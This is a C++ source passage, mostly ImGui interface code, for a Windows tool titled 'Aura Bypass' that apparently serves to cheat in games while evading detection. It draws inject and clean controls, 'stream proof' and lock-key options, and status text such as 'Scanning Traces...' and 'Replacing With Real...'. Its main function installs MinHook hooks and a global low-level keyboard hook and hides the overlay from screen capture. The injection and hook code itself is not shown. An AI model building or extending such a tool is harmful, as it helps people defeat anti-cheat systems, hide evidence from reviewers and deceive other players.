    const char* txt = nullptr;
    if (failed)
        txt = "Clean Failed.";
    else if (done && found)
        txt = "Real Installed.";
    else if (done && !found)
        txt = "No Traces Found.";
    else if (stage >= 1)
        txt = "Replacing With Real...";
    else
        txt = "Scanning Traces...";

    const float size = 14.0f;
    const ImVec2 ts = font->CalcTextSizeA(size, FLT_MAX, 0.0f, txt);
    draw->AddText(font, size, ImVec2(c.x - ts.x * 0.5f, mn.y + 60.0f),
        IM_COL32(255, 255, 255, (int)(245.0f * fade)), txt);
}

static char s_userName[256] = { 0 };
static char s_pcName[256] = { 0 };

void FetchSystemInfo() {
    DWORD n = sizeof(s_userName);
    if (!::GetUserNameA(s_userName, &n))
        wsprintfA(s_userName, "-");
    n = sizeof(s_pcName);
    if (!::GetComputerNameA(s_pcName, &n))
        wsprintfA(s_pcName, "-");
}

void DrawCardBase(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx) {
    const float rounding = 14.0f;
    draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, 255), rounding);
    draw->AddRect(mn, mx, IM_COL32(85, 85, 85, 80), rounding, 0, 1.0f);
}

void DrawInfoRow(ImDrawList* draw, ImFont* font, float x, float& y,
    const char* icon, const char* label, const char* value) {
    ImFont* iconFont = g_fontIcons ? g_fontIcons : ImGui::GetFont();
    const float iconSize = 16.0f;
    const float textX = x + iconSize + 10.0f;

    const float labelH = font->CalcTextSizeA(kLabelSize, FLT_MAX, 0.0f, label).y;
    const float valueH = font->CalcTextSizeA(kLabelSize, FLT_MAX, 0.0f, value).y;
    const float rowH = labelH + 2.0f + valueH;

    const ImVec2 its = iconFont->CalcTextSizeA(iconSize, FLT_MAX, 0.0f, icon);
    draw->AddText(iconFont, iconSize,
        ImVec2(x, y + (rowH - its.y) * 0.5f),
        IM_COL32(255, 255, 255, 200), icon);

    draw->AddText(font, kLabelSize, ImVec2(textX, y), IM_COL32(255, 255, 255, 110), label);
    draw->AddText(font, kLabelSize, ImVec2(textX, y + labelH + 2.0f),
        IM_COL32(255, 255, 255, 240), value);

    y += rowH + 12.0f;
}

static void MaskTopCorners(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx,
    float rounding, ImU32 bg) {
    const float R = rounding + 1.0f;
    for (int i = 0; i <= (int)rounding; ++i) {
        const float dy = R - ((float)i + 0.5f);
        const float dx = sqrtf(fmaxf(0.0f, R * R - dy * dy));
        const float w = R - dx;
        if (w <= 0.05f) continue;
        const float y0 = mn.y + (float)i;
        draw->AddRectFilled(ImVec2(mn.x, y0), ImVec2(mn.x + w, y0 + 1.0f), bg);
        draw->AddRectFilled(ImVec2(mx.x - w, y0), ImVec2(mx.x, y0 + 1.0f), bg);
    }
}

float DrawAnimatedHeader(ImDrawList* draw, ImFont* textFont,
    const ImVec2& mn, const ImVec2& mx, const char* label) {
    const float rounding = 14.0f;
    const float headerH = 34.0f;
    const ImVec2 hmax(mx.x, mn.y + headerH);
    const float t = (float)ImGui::GetTime();

    draw->AddRectFilled(mn, hmax, IM_COL32(12, 13, 16, 255), rounding);
    draw->AddRectFilled(ImVec2(mn.x, hmax.y - rounding), hmax,
        IM_COL32(12, 13, 16, 255));

    draw->PushClipRect(mn, hmax, true);

    draw->AddRectFilledMultiColor(mn, hmax,
        IM_COL32(255, 255, 255, 9), IM_COL32(255, 255, 255, 2),
        IM_COL32(255, 255, 255, 1), IM_COL32(255, 255, 255, 6));

    const float W = mx.x - mn.x;
    const float cycle = W + 150.0f;
    const float sheenX = mn.x - 75.0f + fmodf(t * 27.0f + mn.x * 0.17f, cycle);
    draw->AddRectFilledMultiColor(
        ImVec2(sheenX - 55.0f, mn.y), ImVec2(sheenX, hmax.y),
        IM_COL32(255, 255, 255, 0), IM_COL32(255, 255, 255, 18),
        IM_COL32(255, 255, 255, 18), IM_COL32(255, 255, 255, 0));
    draw->AddRectFilledMultiColor(
        ImVec2(sheenX, mn.y), ImVec2(sheenX + 55.0f, hmax.y),
        IM_COL32(255, 255, 255, 18), IM_COL32(255, 255, 255, 0),
        IM_COL32(255, 255, 255, 0), IM_COL32(255, 255, 255, 18));

    const ImVec2 markMin(mn.x + 14.0f, mn.y + 10.0f);
    const ImVec2 markMax(markMin.x + 3.0f, mn.y + 24.0f);
    draw->AddRectFilled(ImVec2(markMin.x - 2.0f, markMin.y - 2.0f),
        ImVec2(markMax.x + 2.0f, markMax.y + 2.0f),
        IM_COL32(255, 255, 255, 18), 4.0f);
    draw->AddRectFilled(markMin, markMax, IM_COL32(235, 238, 245, 235), 2.0f);

    const float textSize = 13.0f;
    const ImVec2 ts = textFont->CalcTextSizeA(textSize, FLT_MAX, 0.0f, label);
    const ImVec2 tp(mn.x + 25.0f, mn.y + (headerH - ts.y) * 0.5f);
    draw->AddText(textFont, textSize, ImVec2(tp.x, tp.y + 1.0f),
        IM_COL32(0, 0, 0, 180), label);
    draw->AddText(textFont, textSize, tp, IM_COL32(242, 244, 248, 245), label);

    const float dotsX = mx.x - 17.0f;
    for (int i = 0; i < 3; ++i)
        draw->AddCircleFilled(ImVec2(dotsX - i * 5.0f, mn.y + headerH * 0.5f),
            1.0f, IM_COL32(255, 255, 255, 55 + i * 18), 8);

    draw->PopClipRect();

    MaskTopCorners(draw, mn, mx, rounding, IM_COL32(0, 0, 0, 255));

    const float divY = hmax.y;
    draw->AddLine(ImVec2(mn.x + 1.0f, divY + 1.0f),
        ImVec2(mx.x - 1.0f, divY + 1.0f), IM_COL32(0, 0, 0, 110), 1.0f);
    draw->AddLine(ImVec2(mn.x + 1.0f, divY),
        ImVec2(mx.x - 1.0f, divY), IM_COL32(150, 160, 178, 48), 1.0f);
    return divY;
}

void DrawInfosCard(ImDrawList* draw, const ImVec2& mn, const ImVec2& mx) {
    const float padX = 16.0f;
    const float rounding = 14.0f;
    ImFont* textFont = g_fontText ? g_fontText : ImGui::GetFont();

    draw->AddRectFilled(mn, mx, IM_COL32(30, 30, 30, 255), rounding);

    float y = DrawAnimatedHeader(draw, textFont, mn, mx, "INFOS") + 12.0f;

    DrawInfoRow(draw, textFont, mn.x + padX, y, ICON_FA_USER, "Usuario", s_userName);
    DrawInfoRow(draw, textFont, mn.x + padX, y, ICON_FA_DESKTOP, "Nome do PC", s_pcName);
    DrawInfoRow(draw, textFont, mn.x + padX, y, ICON_FA_INFINITY, "Plan Type", "Life Time");

    SYSTEMTIME st = {};
    ::GetLocalTime(&st);
    char dtBuf[64];
    wsprintfA(dtBuf, "%02d/%02d/%04d %02d:%02d",
        st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute);
    DrawInfoRow(draw, textFont, mn.x + padX, y, ICON_FA_CLOCK, "Data e hora", dtBuf);

    {
        const char* msg = "Farme Aura Nos Teladores Meia Boca!";
        const float msgSize = 10.0f;
        ImFont* iconFont = g_fontIcons ? g_fontIcons : ImGui::GetFont();
        const float iconSize = 11.0f;
        const float gap = 6.0f;
        const ImVec2 its = iconFont->CalcTextSizeA(iconSize, FLT_MAX, 0.0f, ICON_FA_CIRCLE_INFO);
        const ImVec2 ms = textFont->CalcTextSizeA(msgSize, FLT_MAX, 0.0f, msg);
        const float totalW = its.x + gap + ms.x;
        const float cx = mn.x + ((mx.x - mn.x) - totalW) * 0.5f;
        const float ly = y + 16.0f;
        draw->AddText(iconFont, iconSize,
            ImVec2(cx, ly + (ms.y - its.y) * 0.5f),
            IM_COL32(255, 255, 255, 200), ICON_FA_CIRCLE_INFO);
        draw->AddText(textFont, msgSize, ImVec2(cx + its.x + gap, ly),
            IM_COL32(255, 255, 255, 200), msg);
    }

    draw->AddRect(mn, mx, IM_COL32(85, 85, 85, 80), rounding, 0, 1.0f);
}

static void DrawYinYang(ImDrawList* draw, const ImVec2& c, float r) {
    const ImU32 light = IM_COL32(242, 244, 248, 255);
    const ImU32 dark = IM_COL32(12, 13, 16, 255);
    const float pi = 3.1415926535f;

    draw->AddCircleFilled(c, r + 3.0f, IM_COL32(255, 255, 255, 13), 48);

    draw->AddCircleFilled(c, r, light, 48);
    draw->PathClear();
    draw->PathLineTo(c);
    draw->PathArcTo(c, r, -pi * 0.5f, pi * 0.5f, 28);
    draw->PathFillConvex(dark);

    const float halfR = r * 0.5f;
    const ImVec2 upper(c.x, c.y - halfR);
    const ImVec2 lower(c.x, c.y + halfR);
    draw->AddCircleFilled(upper, halfR, dark, 32);
    draw->AddCircleFilled(lower, halfR, light, 32);

    draw->AddCircleFilled(upper, r * 0.115f, light, 20);
    draw->AddCircleFilled(lower, r * 0.115f, dark, 20);

    draw->AddCircle(c, r, IM_COL32(255, 255, 255, 145), 48, 1.0f);
}

void DrawUI(HWND hWnd) {
    ImGui::SetNextWindowPos(ImVec2(0.0f, 0.0f));
    ImGui::SetNextWindowSize(ImVec2(kPanelW, kPanelH));

    ImGui::Begin("##overlay", nullptr,
        ImGuiWindowFlags_NoTitleBar |
        ImGuiWindowFlags_NoResize |
        ImGuiWindowFlags_NoMove |
        ImGuiWindowFlags_NoScrollbar |
        ImGuiWindowFlags_NoScrollWithMouse |
        ImGuiWindowFlags_NoCollapse |
        ImGuiWindowFlags_NoDecoration |
        ImGuiWindowFlags_NoBackground |
        ImGuiWindowFlags_NoSavedSettings);

    ImDrawList* draw = ImGui::GetWindowDrawList();
    const ImVec2 p = ImGui::GetCursorScreenPos();
    const ImVec2 q = ImVec2(p.x + kPanelW, p.y + kPanelH);

    draw->AddRectFilled(p, q, IM_COL32(0, 0, 0, 255), kRounding);

    {
        ImFont* textFont = g_fontText ? g_fontText : ImGui::GetFont();
        const char* title = "Aura Bypass";
        const ImVec2 ts = textFont->CalcTextSizeA(kLabelSize, FLT_MAX, 0.0f, title);

        const float x0 = p.x + kTitlePadX;
        const float titleBarH = 48.0f;
        const float symbolR = 13.0f;
        const ImVec2 symbolCenter(x0 + symbolR, p.y + titleBarH * 0.5f);

        DrawYinYang(draw, symbolCenter, symbolR);

        const float textX = x0 + symbolR * 2.0f + 10.0f;
        const float textY = p.y + (titleBarH - ts.y) * 0.5f;
        draw->AddText(textFont, kLabelSize, ImVec2(textX, textY),
            IM_COL32(255, 255, 255, 255), title);
    }

    ImVec2 featMin(0.0f, 0.0f), featMax(0.0f, 0.0f);

    {
        const float cardW = 275.0f, cardH = 256.0f, gap = 18.0f;
        const float x0 = p.x + (kPanelW - (cardW * 2.0f + gap)) * 0.5f;
        const float y0 = p.y + 48.0f;

        DrawInfosCard(draw, ImVec2(x0, y0), ImVec2(x0 + cardW, y0 + cardH));

        {
            const ImVec2 rmn(x0 + cardW + gap, y0);
            const ImVec2 rmx(x0 + cardW * 2.0f + gap, y0 + cardH);
            DrawCardBase(draw, rmn, rmx);
            const float divY = DrawAnimatedHeader(draw,
                g_fontText ? g_fontText : ImGui::GetFont(), rmn, rmx, "FEATURES");

            const float by = divY + 22.0f;
            const float bW = 245.0f, bH = 40.0f;
            const ImVec2 iMn(rmx.x - 16.0f - bW, by);
            DrawInjectControl(draw, iMn, ImVec2(iMn.x + bW, by + bH),
                featMin, featMax);

            const float cleanY = by + bH + 25.0f;
            const ImVec2 cMn(iMn.x, cleanY);
            ImVec2 cleanMin, cleanMax;
            DrawCleanControl(draw, cMn, ImVec2(cMn.x + bW, cleanY + bH),
                cleanMin, cleanMax);
            (void)cleanMin;

            featMax = cleanMax;

            const float checkH = 30.0f;
            const float gapCk = 6.0f;
            const float totalW = (rmx.x - rmn.x) - 28.0f;
            const float spW = totalW * 0.55f;
            const float lkW = totalW - spW - gapCk;

            const ImVec2 spMin(rmn.x + 14.0f, rmx.y - 5.0f - checkH);
            const ImVec2 spMax(spMin.x + spW, rmx.y - 5.0f);
            ImVec2 spOutMin, spOutMax;
            DrawStreamProofCheckbox(draw, spMin, spMax, spOutMin, spOutMax);
            (void)spOutMin;

            const ImVec2 lkMin(spMax.x + gapCk, spMin.y);
            const ImVec2 lkMax(lkMin.x + lkW, spMax.y);
            ImVec2 lkOutMin, lkOutMax;
            DrawLockKeyCheckbox(draw, lkMin, lkMax, lkOutMin, lkOutMax);
            (void)lkOutMin;

            featMax.y = spOutMax.y;

            draw->AddRect(rmn, rmx, IM_COL32(85, 85, 85, 80), kRounding, 0, 1.0f);
        }
    }

    ImVec2 exMin, exMax;
    DrawWindowButtons(draw, p, q, hWnd, exMin, exMax);

    HandleDrag(hWnd, p, q, exMin, exMax, featMin, featMax);

    DrawInjectMenu(draw, p, q);
    DrawCleanMenu(draw, p, q);

    ImGui::End();
}

void EnableTransparency(HWND hWnd) {
    MARGINS margins = { -1, -1, -1, -1 };
    ::DwmExtendFrameIntoClientArea(hWnd, &margins);
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE, _In_ LPSTR, _In_ int nCmdShow) {
    ::srand((unsigned)::time(nullptr));

    WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0, 0,
                       hInstance, nullptr, nullptr, nullptr,
                       nullptr, L"bipasClass", nullptr };
    ::RegisterClassExW(&wc);

    const int screenW = ::GetSystemMetrics(SM_CXSCREEN);
    const int screenH = ::GetSystemMetrics(SM_CYSCREEN);
    const int x0 = (screenW - (int)kPanelW) / 2;
    const int y0 = (screenH - (int)kPanelH) / 2;

    HWND hwnd = ::CreateWindowExW(
        WS_EX_TOOLWINDOW | WS_EX_TOPMOST | WS_EX_NOACTIVATE,
        wc.lpszClassName, L"bipas",
        WS_POPUP, x0, y0, (int)kPanelW, (int)kPanelH,
        nullptr, nullptr, wc.hInstance, nullptr);

    if (!hwnd) {
        ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    {
        BOOL no = FALSE;
        ::DwmSetWindowAttribute(hwnd, 2, &no, sizeof(no));
    }

    if (!CreateDeviceD3D(hwnd)) {
        CleanupDeviceD3D();
        ::DestroyWindow(hwnd);
        ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    EnableTransparency(hwnd);

    g_overlayHwnd = hwnd;

    InstallMinHooks();
    g_hKbHook = ::SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
        ::GetModuleHandleW(nullptr), 0);

    ApplyStreamProof();

    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGui::StyleColorsDark();

    ImGuiStyle& style = ImGui::GetStyle();
    style.WindowPadding = ImVec2(0.0f, 0.0f);
    style.WindowBorderSize = 0.0f;
    style.WindowRounding = 0.0f;
    style.AntiAliasedLines = true;
    style.AntiAliasedFill = true;

    LoadFonts();
    FetchSystemInfo();

    ImGui_ImplWin32_Init(hwnd);
    ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext);
    ImGui_ImplDX11_CreateDeviceObjects();

    ::ShowWindow(hwnd, nCmdShow);
    ::UpdateWindow(hwnd);

    while (g_running) {
        MSG msg;
        while (::PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE)) {
            ::TranslateMessage(&msg);
            ::DispatchMessage(&msg);
            if (msg.message == WM_QUIT)
                g_running = false;
        }
        if (!g_running) break;

        ImGui_ImplDX11_NewFrame();
        ImGui_ImplWin32_NewFrame();
        ImGui::NewFrame();

        DrawUI(hwnd);

        ImGui::Render();
        const float clear[4] = { 0.0f, 0.0f, 0.0f, 0.0f };
        g_pd3dDeviceContext->OMSetRenderTargets(1, &g_mainRTV, nullptr);
        g_pd3dDeviceContext->ClearRenderTargetView(g_mainRTV, clear);
        ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());

        g_pSwapChain->Present(1, 0);
    }

    ImGui_ImplDX11_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();

    UninstallMinHooks();

    CleanupDeviceD3D();
    ::DestroyWindow(hwnd);
    ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
    return 0;
}
